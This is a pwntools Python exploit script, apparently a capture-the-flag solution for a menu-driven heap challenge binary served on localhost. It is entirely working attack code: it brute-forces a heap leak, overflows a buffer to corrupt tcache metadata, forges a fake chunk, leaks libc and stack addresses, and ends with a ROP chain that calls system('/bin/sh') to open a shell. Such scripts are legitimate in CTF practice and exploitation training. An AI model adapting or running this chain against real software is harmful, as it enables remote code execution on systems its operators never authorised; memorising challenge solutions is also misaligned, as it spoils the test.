from pwn import *

context.binary = elf = ELF("./service/chall")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
if args.REMOTE:
    p = remote("localhost", 5000)
else:
    p = process("./service/chall", aslr=True)
stat = log.progress("enum")
i = 0

while True:

    p.sendlineafter(b"Action: ", b"8")
    p.sendlineafter(b"Action: ", b"5")
    p.sendlineafter(b"Action: ", b"6")
    p.sendlineafter(b"Action: ", b"1")

    p.recvuntil(b"Name: ")
    try:
        leak = unpack(p.recvline().split()[1], "all")
    except:
        continue
    i += 1
    stat.status(f"{i} {hex(leak)}")
    if leak == 0x405:
        break

stat.success(f"beap found after {i} tries")

p.sendlineafter(b"Action: ", b"2")
p.sendlineafter(b"> ", str(2**31).encode()) # prepare for buffer overflow

payload = b"A"*0xe80
payload += p64(0x0) + p64(0x291)
payload += p16(0x0)*15
payload += p16(0x1)
payload += p16(0x0)*48
payload += p64(0x0)*15
payload += p64(0x404100)


p.sendlineafter(b"Action: ", b"7")
p.sendafter(b"reflection?\n", payload)
p.sendlineafter(b"Action: ", b"3")

# create fake tcache chunk to be freed
p.sendafter(b"> ", b"\x00"*0x8 + p64(0x111) + b"\x00"*0x18 + p64(0x4040e0) + b"\x00"*0x20 + p64(0x404110))
p.sendlineafter(b"Action: ", b"1")
p.recvuntil(b"Name: ")
leak = unpack(p.recvuntil(b" ", drop=True), "all") -2219328
libc.address = leak + 9664
log.info(f"leak @ {hex(leak)}")

p.sendlineafter(b"Action: ", b"4")
p.sendlineafter(b"> ", b"1")

p.sendlineafter(b"Action: ", b"3")
p.sendafter(b"> ", b"\x00"*0x18 + p64(leak))

p.sendlineafter(b"Action: ", b"1")
p.recvuntil(b"Name: ")
stack_leak = unpack(p.recvuntil(b" ", drop=True), "all")
log.info(f"stack leak @ {hex(stack_leak)}")

payload = b"A"*0xe80
payload += p64(0x0) + p64(0x291)
payload += p16(0x0)*15
payload += p16(0x1)
payload += p16(0x0)*48
payload += p64(0x0)*15
payload += p64(stack_leak-0x50)

rop = ROP(libc)
rop.call(rop.ret)
rop.system(next(libc.search(b"/bin/sh\x00")))

p.sendlineafter(b"Action: ", b"2")
p.sendlineafter(b"> ", str(2**31).encode()) # prepare for buffer overflow
p.sendlineafter(b"Action: ", b"7")
p.sendafter(b"reflection?\n", payload)
p.sendlineafter(b"Action: ", b"3")
p.sendlineafter(b"> ", b"A"*8 + rop.chain())

p.interactive()
